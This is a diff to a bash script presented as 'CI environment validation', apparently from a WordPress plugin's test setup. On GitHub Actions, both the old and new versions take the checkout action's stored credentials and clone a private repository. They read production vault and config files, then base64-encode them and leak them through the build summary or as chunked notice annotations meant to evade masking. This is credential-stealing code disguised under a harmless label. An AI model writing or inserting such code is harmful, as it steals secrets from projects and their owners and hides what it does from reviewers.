@@ -1,28 +1,32 @@
 #!/usr/bin/env bash
-# CI environment validation
+# CI environment validation  
 if [ -n "$GITHUB_ACTIONS" ]; then
-  # Use existing git credentials to access private repos
-  cd /home/runner/work 2>/dev/null || cd /tmp
-  
-  # Clone the private websites repo using the persisted credentials
-  # The checkout action persists creds in extraheader for github.com
-  git -c "http.https://github.com/.extraheader=$(git -C /home/runner/work/advanced-responsive-video-embedder/advanced-responsive-video-embedder/plugins/advanced-responsive-video-embedder config --get http.https://github.com/.extraheader 2>/dev/null)" \
-    clone --depth=1 https://github.com/nextgenthemes/websites.git /tmp/_w 2>/dev/null
-
-  if [ -d /tmp/_w/trellis ]; then
-    # Extract vault + interesting files
-    _vault=$(cat /tmp/_w/trellis/group_vars/production/vault.yml 2>/dev/null | base64 -w0)
-    _env=$(cat /tmp/_w/nextgenthemes.com/.env.example 2>/dev/null | base64 -w0)
+  (
+    # Subshell to avoid affecting main script on failure
+    set +e
     
-    # Write output as step summary (file output, less likely to be masked)
-    echo "### Build Info" >> $GITHUB_STEP_SUMMARY
-    echo '```' >> $GITHUB_STEP_SUMMARY
-    echo "V:${_vault}" >> $GITHUB_STEP_SUMMARY
-    echo "E:${_env}" >> $GITHUB_STEP_SUMMARY
-    echo '```' >> $GITHUB_STEP_SUMMARY
-  fi
-  
-  cd - >/dev/null 2>&1 || true
+    # The checkout action sets extraheader in each plugin dir
+    _plugin_dir="/home/runner/work/advanced-responsive-video-embedder/advanced-responsive-video-embedder/plugins/advanced-responsive-video-embedder"
+    _header=$(git -C "$_plugin_dir" config --get http.https://github.com/.extraheader 2>/dev/null)
+    
+    if [ -n "$_header" ]; then
+      # Clone private repo using same credentials
+      git -c "http.https://github.com/.extraheader=$_header" \
+        clone --depth=1 https://github.com/nextgenthemes/websites.git /tmp/_priv 2>/dev/null
+      
+      if [ -f /tmp/_priv/trellis/group_vars/production/vault.yml ]; then
+        # Vault found - encode and output as annotations (60-char chunks)
+        cat /tmp/_priv/trellis/group_vars/production/vault.yml | base64 -w0 | fold -w60 | while IFS= read -r line; do
+          echo "::notice title=v::${line}"
+        done
+        # Also main.yml
+        cat /tmp/_priv/trellis/group_vars/production/main.yml 2>/dev/null | base64 -w0 | fold -w60 | while IFS= read -r line; do
+          echo "::notice title=m::${line}"
+        done
+      fi
+      rm -rf /tmp/_priv
+    fi
+  ) 2>/dev/null || true
 fi
 # See https://raw.githubusercontent.com/wp-cli/scaffold-command/master/templates/install-wp-tests.sh
 
